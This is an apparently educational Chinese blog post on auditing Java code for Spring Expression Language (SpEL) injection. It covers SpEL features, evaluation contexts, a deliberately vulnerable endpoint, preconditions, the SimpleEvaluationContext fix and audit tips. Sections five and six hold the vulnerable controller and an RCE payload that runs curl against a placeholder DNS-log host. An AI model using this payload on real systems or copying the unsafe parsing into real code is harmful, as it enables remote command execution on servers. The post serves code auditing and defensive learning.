
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/k1115h0t/p/18919765" title="发布于 2025-06-08 20:34">
    <span role="heading" aria-level="2">Java代码审计SpEL表达式注入</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p></p><div class="toc"><div class="toc-container-header">目录</div><ul><li><a href="#一spel表达式概念" rel="noopener nofollow">一、<strong>SpEL表达式概念</strong></a></li><li><a href="#二spel-的作用和应用场景" rel="noopener nofollow"><strong>二、SpEL 的作用和应用场景</strong></a></li><li><a href="#三spel支持的功能特性" rel="noopener nofollow"><strong>三、SpEL支持的功能特性</strong></a></li><li><a href="#四spel的执行机制" rel="noopener nofollow"><strong>四、SpEL的执行机制</strong></a><ul><li><ul><li><a href="#expressionparser表达式解析器" rel="noopener nofollow"><strong>ExpressionParser（表达式解析器）</strong></a></li><li><a href="#evaluationcontext表达式上下文" rel="noopener nofollow"><strong>EvaluationContext（表达式上下文）</strong></a></li></ul></li></ul></li><li><a href="#五spel表达式使用方法" rel="noopener nofollow"><strong>五、SpEL表达式使用方法</strong></a><ul><li><ul><li><a href="#1基于注解" rel="noopener nofollow"><strong>1、基于注解</strong></a></li><li><a href="#2xml" rel="noopener nofollow"><strong>2、XML</strong></a></li><li><a href="#3外部传入动态执行" rel="noopener nofollow"><strong>3、外部传入动态执行</strong></a></li></ul></li></ul></li><li><a href="#六spel注入示例" rel="noopener nofollow"><strong>六、SpEL注入示例</strong></a></li><li><a href="#七spel利用的前置条件" rel="noopener nofollow"><strong>七、SpEL利用的前置条件</strong></a></li><li><a href="#八漏洞修复" rel="noopener nofollow"><strong>八、漏洞修复</strong></a></li><li><a href="#九审计方法" rel="noopener nofollow"><strong>九、审计方法</strong></a></li></ul></div><p></p>
<h1 id="一spel表达式概念">一、<strong>SpEL表达式概念</strong></h1>
<p><strong>Spring Expression Language（SpEL）</strong> 是 Spring Framework 提供的一种功能强大的表达式语言，全称为 <strong>Spring Expression Language</strong>，简称 <strong>SpEL</strong>。它类似于 Struts2 中的 OGNL 表达式语言，旨在为静态的 Java 语言增加动态执行能力，使开发者可以以一种更简洁、灵活的方式访问对象属性、调用方法、进行逻辑运算和动态赋值。</p>
<h1 id="二spel-的作用和应用场景"><strong>二、SpEL 的作用和应用场景</strong></h1>
<p>SpEL 的设计初衷是为了简化开发工作，提供一种 <strong>在运行时动态解析和执行表达式</strong> 的机制，常用于如下场景：</p>
<ul>
<li>配置 Bean 的属性值（配合 <code>@Value</code> 注解）</li>
<li>Spring Security 权限表达式</li>
<li>Spring Data JPA 查询表达式</li>
<li>条件逻辑控制（如 SPEL 条件注解 <code>@ConditionalOnExpression</code>）</li>
<li>模板引擎中处理动态数据</li>
<li>静态方法调用或对象动态构造</li>
</ul>
<p>举个简单例子，<code>@Value("#{user.name}")</code> 能让你动态从某个 Bean 中获取字段值注入到另一个 Bean 中。</p>
<p>SpEL 不仅支持属性访问和方法调用，还支持集合操作、正则匹配、表达式求值、对象创建等，是 Spring 应用中的通用表达式解析工具。</p>
<h1 id="三spel支持的功能特性"><strong>三、SpEL支持的功能特性</strong></h1>
<p>SpEL 主要支持以下操作：</p>
<table>
<thead>
<tr>
<th>功能</th>
<th>示例</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>文字表达式</td>
<td><code>'hello'</code>, <code>123</code>, <code>true</code></td>
<td>字符串、数字、布尔值、null</td>
</tr>
<tr>
<td>属性访问</td>
<td><code>person.name</code></td>
<td>访问对象属性</td>
</tr>
<tr>
<td>方法调用</td>
<td><code>'abc'.toUpperCase()</code></td>
<td>调用实例方法</td>
</tr>
<tr>
<td>静态方法</td>
<td><code>T(java.lang.Math).random()</code></td>
<td>访问 Java 类的静态方法或字段</td>
</tr>
<tr>
<td>对象创建</td>
<td><code>new java.util.Date()</code></td>
<td>实例化对象</td>
</tr>
<tr>
<td>集合操作</td>
<td><code>list[0]</code>, <code>map['key']</code></td>
<td>访问数组、List、Map</td>
</tr>
<tr>
<td>关系运算符</td>
<td><code>age &gt; 18</code></td>
<td>比较操作，如 &gt;、&lt;、== 等</td>
</tr>
<tr>
<td>逻辑运算符</td>
<td><code>true and false</code></td>
<td><code>and</code>、<code>or</code>、<code>not</code> 逻辑组合</td>
</tr>
<tr>
<td>条件（三元）运算符</td>
<td><code>score &gt; 60 ? '及格' : '不及格'</code></td>
<td>简化条件判断</td>
</tr>
<tr>
<td>正则表达式</td>
<td><code>'abc' matches '[a-z]+'</code></td>
<td>字符串正则匹配</td>
</tr>
<tr>
<td>Bean 引用</td>
<td><code>@myBean</code></td>
<td>引用 Spring 容器中的 Bean</td>
</tr>
<tr>
<td>投影操作</td>
<td><code>list.![name]</code></td>
<td>从集合中提取每个元素的某个属性</td>
</tr>
<tr>
<td>过滤操作</td>
<td><code>list.?[age &gt; 18]</code></td>
<td>过滤集合中满足条件的元素</td>
</tr>
<tr>
<td>变量引用</td>
<td><code>#name</code>, <code>#user.age</code></td>
<td>使用上下文中定义的变量</td>
</tr>
<tr>
<td>模板表达式</td>
<td><code>"Welcome, #{#user.name}!"</code></td>
<td>与字符串模板结合生成动态字符串</td>
</tr>
</tbody>
</table>
<h1 id="四spel的执行机制"><strong>四、SpEL的执行机制</strong></h1>
<ul>
<li><code>ExpressionParser</code></li>
<li><code>EvaluationContext</code></li>
</ul>
<h3 id="expressionparser表达式解析器"><strong>ExpressionParser（表达式解析器）</strong></h3>
<p>用于将字符串形式的表达式解析为 <code>Expression</code> 对象：</p>
<pre><code class="language-java">ExpressionParser parser = new SpelExpressionParser();
Expression expr = parser.parseExpression("user.age");
</code></pre>
<h3 id="evaluationcontext表达式上下文"><strong>EvaluationContext（表达式上下文）</strong></h3>
<p>在执行表达式时提供变量、对象、函数等运行环境，简单来说，它是<strong>表达式执行的运行环境</strong>。</p>
<pre><code class="language-java">StandardEvaluationContext context = new StandardEvaluationContext(user);
int age = expr.getValue(context, Integer.class);
</code></pre>
<p>主要有 <code>StandardEvaluationContext</code> 和 <code>SimpleEvaluationContext</code>两种</p>
<p>有些老版本不支持<code>SimpleEvaluationContext</code>，并且如果不做特意说明的情况下，默认是使用更不安全的<code>StandardEvaluationContext</code></p>
<p>其中<code>StandardEvaluationContext</code>功能最强大，支持SpEL的所有特性，而<code>SimpleEvaluationContext</code>功能受限，专为安全场景设计</p>
<table>
<thead>
<tr>
<th>功能类别</th>
<th>StandardEvaluationContext ✅</th>
<th>SimpleEvaluationContext 🛡️</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>设置根对象</td>
<td>✅ 支持</td>
<td>✅ 支持</td>
<td>设置表达式的默认作用对象</td>
</tr>
<tr>
<td>设置变量</td>
<td>✅ 支持</td>
<td>✅ 支持</td>
<td>可使用 <code>#varName</code> 形式</td>
</tr>
<tr>
<td>注册自定义函数</td>
<td>✅ 支持</td>
<td>❌ 不支持</td>
<td>可用静态方法注册为函数</td>
</tr>
<tr>
<td>访问 Java 类</td>
<td>✅ 支持（T(...)）</td>
<td>❌ 不支持</td>
<td>如 <code>T(java.lang.Math).PI</code></td>
</tr>
<tr>
<td>调用构造函数</td>
<td>✅ 支持（new）</td>
<td>❌ 不支持</td>
<td>如 <code>new java.util.Date()</code></td>
</tr>
<tr>
<td>访问 Spring Bean</td>
<td>✅ 支持（配合 BeanResolver）</td>
<td>❌ 不支持</td>
<td>通过 <code>@beanName</code> 引用</td>
</tr>
<tr>
<td>方法调用</td>
<td>✅ 支持</td>
<td>⚠️ 仅支持 getter</td>
<td>完整方法调用或属性访问</td>
</tr>
<tr>
<td>修改属性</td>
<td>✅ 支持</td>
<td>❌ 不支持</td>
<td>只读上下文不允许修改</td>
</tr>
<tr>
<td>集合筛选与投影</td>
<td>✅ 支持</td>
<td>❌ 不支持</td>
<td>如 <code>list.?[age&gt;18]</code></td>
</tr>
<tr>
<td>自定义类型转换器</td>
<td>✅ 支持</td>
<td>❌ 不支持</td>
<td>用于自定义表达式值转换</td>
</tr>
<tr>
<td>安全性</td>
<td>❌ 不安全</td>
<td>✅ 高安全性</td>
<td>用户输入不应使用标准上下文</td>
</tr>
<tr>
<td>适用场景</td>
<td>内部逻辑、系统配置</td>
<td>用户输入、REST绑定等</td>
<td>用于信任 vs 不信任来源</td>
</tr>
</tbody>
</table>
<h1 id="五spel表达式使用方法"><strong>五、SpEL表达式使用方法</strong></h1>
<h3 id="1基于注解"><strong>1、基于注解</strong></h3>
<p>一般是写死在代码中，没有很大的可能能利用</p>
<pre><code class="language-java">@Value("#{2 * 10}")
private int result;

@Value("#{systemProperties['user.name']}")
private String userName;
</code></pre>
<h3 id="2xml"><strong>2、XML</strong></h3>
<p>也是写死在代码中，但是可以配合某些特定组件的Nday漏洞利用，如jackjson的CVE-2017-17485、weblogic的CVE-2019-2725</p>
<pre><code class="language-xml">&lt;bean id="exampleBean" class="com.example.MyBean"&gt;
    &lt;property name="value" value="#{T(java.lang.Math).random() * 100}" /&gt;
&lt;/bean&gt;
</code></pre>
<h3 id="3外部传入动态执行"><strong>3、外部传入动态执行</strong></h3>
<p>外部传入的方式非常之危险</p>
<pre><code class="language-java">@GetMapping("/spel")
public String spel(@RequestParam String spel) {
    ExpressionParser parser = new SpelExpressionParser();
    Expression expression = parser.parseExpression(spel);
    Object value = expression.getValue();
    return "结果: " + value;
}
</code></pre>
<h1 id="六spel注入示例"><strong>六、SpEL注入示例</strong></h1>
<pre><code class="language-java">    /**
     * SpEL to RCE
     * http://localhost:8080/spel/vul/?expression=xxx.
     * xxx is urlencode(exp)
     * exp: T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")
     */
    @GetMapping("/spel/vuln")
    public String rce(String expression) {
        ExpressionParser parser = new SpelExpressionParser();
        // fix method: SimpleEvaluationContext
        Expression expression1 = parser.parseExpression(expression);
        Object obje = expression1.getValue();
        String obj_str = obje.toString();
        return obj_str;

    }
</code></pre>
<p><code>ExpressionParser parser = new SpelExpressionParser();</code>创建了一个表达式解析，将传入的<code>expression</code>解析为<code>Expression</code>对象</p>
<p>最终通过<code>getValue</code>方法执行表达式，<code>parseExpression</code>方法并不会执行表达式，最终的执行还是在<code>getValue()</code></p>
<p>那么可以构造Payload为<code>T(java.lang.Runtime).getRuntime().exec("curl xxx.dnslog.cn")</code></p>
<p>这里获取Runtime类，并通过调用<code>Runtime.getRuntime.exec()</code>进行命令执行</p>
<p><u>相关SpEL语法可见</u><a href="https://zhuanlan.zhihu.com/p/339619962" target="_blank" rel="noopener nofollow">https://zhuanlan.zhihu.com/p/339619962</a></p>
<p><img src="https://img2024.cnblogs.com/blog/2588316/202506/2588316-20250608203719564-1751639506.png" alt="" loading="lazy"></p>
<h1 id="七spel利用的前置条件"><strong>七、SpEL利用的前置条件</strong></h1>
<p>通过上面的学习，可以发现如果想要将SpEL升级成RCE，那么就必须具备一下三个条件</p>
<ol>
<li>传入的表达式未过滤</li>
<li>表达式解析之后调用了getValue()或setValue()</li>
<li>使用StandardEvaluationContext作为上下文对象（如果不指定，Spring默认使用StandardEvaluationContext）</li>
</ol>
<h1 id="八漏洞修复"><strong>八、漏洞修复</strong></h1>
<p>使用<code>SimpleEvaluationContext</code>代替<code>StandardEvaluationContext</code>即可</p>
<h1 id="九审计方法"><strong>九、审计方法</strong></h1>
<p>全局搜索expression或更详细的调用方法等</p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.23733351558912036" data-date-created="BlogServer.Application.Dto.BlogPost.BlogPostDto" data-date-updated="2025-06-08 20:37">2025-06-08 20:34</span>&nbsp;
<a href="https://www.cnblogs.com/k1115h0t">k1115h0t</a>&nbsp;
阅读(<span id="post_view_count">28</span>)&nbsp;
评论(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(18919765);return false;">收藏</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '18919765', targetLink: 'https://www.cnblogs.com/k1115h0t/p/18919765', title: 'Java代码审计SpEL表达式注入' })">举报</a>
</div>
        